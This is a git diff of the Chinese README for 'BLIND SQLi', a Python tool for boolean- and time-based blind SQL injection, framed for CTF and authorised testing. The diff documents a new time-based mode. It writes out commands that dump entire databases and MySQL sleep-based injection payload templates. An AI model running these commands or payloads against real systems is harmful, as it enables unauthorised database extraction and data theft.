@@ -1,9 +1,9 @@
 # ⚡ BLIND SQLi
 
-> 通用 Boolean-Based SQL 盲注提取工具，为 CTF、授权测试与本地靶场场景打磨的轻量级单文件脚本。
+> 通用 Boolean-Based / Time-Based SQL 盲注提取工具，为 CTF、授权测试与本地靶场场景打磨的轻量级单文件脚本。
 
 ![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?logo=python&logoColor=white)
-![Version](https://img.shields.io/badge/version-1.5.2-important)
+![Version](https://img.shields.io/badge/version-1.6.0-important)
 ![依赖](https://img.shields.io/badge/dependencies-requests%20only-9cf)
 ![平台](https://img.shields.io/badge/platform-Windows%20%2F%20Linux%20%2F%20macOS-lightgrey)
 
@@ -15,6 +15,7 @@
 - [使用示例](#使用示例)
 - [参数速查](#参数速查)
 - [历史结果管理](#历史结果管理)
+- [时间盲注](#时间盲注)
 - [安全声明](#安全声明)
 
 ## 特性
@@ -28,6 +29,7 @@
 - **一键枚举数据库**：`--dump`（跳过系统库）/ `--dump-all`（含系统库）自动完成「数据库 → 表 → 列 → 全量数据」枚举，结果保存到 `result/` 目录并自动回放。
 - **关键词搜索**：`--dump-flag <关键词>` 在表名、列名、数据中搜索包含关键词的内容，命中部分红色高亮。
 - **历史管理**：`--view [URL]` 随时回看历次 dump 记录，结果文件按「主机_端口_时间」命名，不覆盖旧记录。
+- **时间盲注支持**：`--time-based` 一键切换到时间盲注模式，基于 sleep + 响应时间判定，自动调整 timeout，同样支持自动闭合探测、`--dump` 等全部功能。
 - **Windows 友好**：双击运行不闪退（`Press Enter to continue...`）、GBK 控制台自动 UTF-8 容错、原生支持 ANSI 颜色。
 
 ## 与 sqlmap 的对比
@@ -36,7 +38,7 @@
 | --- | --- | --- |
 | 体积与依赖 | 单文件，仅依赖 requests | 大型工程，依赖众多 |
 | 启动速度 | < 1 秒 | 数秒 |
-| 注入类型 | Boolean-Based 盲注（专精） | 全类型：布尔 / 报错 / 时间 / UNION / 堆叠 / OOB |
+| 注入类型 | Boolean-Based + Time-Based 盲注 | 全类型：布尔 / 报错 / 时间 / UNION / 堆叠 / OOB |
 | 数据库支持 | MySQL 系 | MySQL / MSSQL / Oracle / PostgreSQL / SQLite 等 |
 | 上手成本 | 参数少，`-h` 分组清晰 | 功能全但参数海量 |
 | 输出噪音 | 简洁，直达结果 | 日志与提示较多 |
@@ -58,7 +60,7 @@
 - 需要自动爬取表单、自动发现注入点、WAF 绕过、哈希破解、`--os-shell` 等能力；
 - 大规模资产测试或 API 集成。
 
-一句话：**sqlmap 是瑞士军刀，BLIND SQLi 是一把为布尔盲注场景磨快的专用刀。**
+一句话：**sqlmap 是瑞士军刀，BLIND SQLi 是一把为布尔 + 时间盲注场景磨快的专用刀。**
 
 ## 快速开始
 
@@ -66,11 +68,15 @@
 # 1. 安装依赖
 pip install requests
 
-# 2. 全自动提取（自动探测闭合方式 + 自动识别 true/false 特征）
+# 2. 全自动布尔盲注提取（自动探测闭合方式 + 自动识别 true/false 特征）
 python blind_sqli.py -u "http://target/index.php?id=1" \
     -q "select flag from flag" --probe-closure --auto-mark
 
-# 3. 全自动枚举整个数据库（库 → 表 → 列 → 全量数据）
+# 3. 全自动时间盲注提取（无回显差异时，基于 sleep 响应时间判定）
+python blind_sqli.py -u "http://target/index.php?id=1" \
+    -q "select flag from flag" --time-based --probe-closure
+
+# 4. 全自动枚举整个数据库（库 → 表 → 列 → 全量数据）
 python blind_sqli.py -u "http://target/index.php?id=1" --dump
 ```
 
@@ -106,6 +112,17 @@ python blind_sqli.py -u "http://target/index.php?id=1" --dump-flag flag
 # 7) 查看历史 dump 记录
 python blind_sqli.py --view "http://target.com"   # 指定目标的最新记录
 python blind_sqli.py --view                       # 列出全部历史
+
+# 8) 时间盲注（适用于页面无回显差异，但可利用 sleep 延迟的场景）
+python blind_sqli.py -u "http://target/index.php?id=1" \
+    -q "select flag from flag" --time-based --probe-closure
+
+# 9) 时间盲注 + 自定义 sleep 秒数 + 字符型闭合
+python blind_sqli.py -u "http://target/index.php?id=1" \
+    -q "select flag from flag" --time-based --sleep-time 3 \
+    --time-payload "1' and if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0)-- -" \
+    --time-eq-payload "1' and if(ascii(substr(({query}),{i},1))={mid},sleep({sleep}),0)-- -" \
+    --time-len-payload "1' and if(length(({query}))>{mid},sleep({sleep}),0)-- -"
 ```
 
 > 详细说明与完整示例见 `python blind_sqli.py --help`，选项按「基本参数 / 特征自动识别 / 请求控制 / 提取控制 / 数据库枚举 / 其他」分组展示。
@@ -129,6 +146,9 @@ python blind_sqli.py --view                       # 列出全部历史
 | `--dump-flag 关键词` | 搜索表名/列名/数据并高亮命中（也支持 `-dump-flag`） |
 | `--view [URL]` | 查看历史 dump 记录 |
 | `--no-verify` | 跳过 TLS 证书校验（自签名证书目标） |
+| `--time-based` | 启用时间盲注模式（基于 sleep + 响应时间判定） |
+| `--sleep-time` | 时间盲注 sleep 秒数（默认 5.0） |
+| `--time-payload / --time-eq-payload / --time-len-payload` | 时间盲注自定义 payload 模板（含 `{sleep}` 占位符） |
 | `--non-interactive` | Windows 下退出时不等待回车（无人值守） |
 
 ## 历史结果管理
@@ -137,6 +157,22 @@ python blind_sqli.py --view                       # 列出全部历史
 - 文件名格式：`主机_端口_年月日-时分.txt`，例如 `challenge-xxx.sandbox.ctfhub.com_10800_2026-8-26-18-48.txt`；
 - 同一分钟重复执行自动追加序号，不覆盖旧记录；
 - `--view URL` 查看指定目标的最新记录，`--view` 列出全部历史。
+
+## 时间盲注
+
+当目标页面无论注入条件真假都没有任何回显差异时（纯盲注），可以使用 `--time-based` 切换到时间盲注模式：
+
+- **原理**：注入 `if(条件, sleep(N), 0)`，通过响应延迟判定条件真假
+- **自动调整 timeout** 为 `sleep_time + 5s`，避免 sleep 触发请求超时
+- **自动探测闭合方式**（时间版）：数字型、单引号、双引号等 6 种候选
+- **兼容所有现有功能**：`--dump`、`--dump-all`、`--dump-flag`、断点续传、多线程等
+- **可自定义** `--time-payload` 等模板适配任意闭合方式（非 MySQL 的 `waitfor delay` 需自行编写 payload）
+
+```bash
+# 最简单的用法：全自动（探测闭合 + 提取）
+python blind_sqli.py -u "http://target/index.php?id=1" \
+    -q "select flag from flag" --time-based --probe-closure --non-interactive
+```
 
 ## 安全声明
 
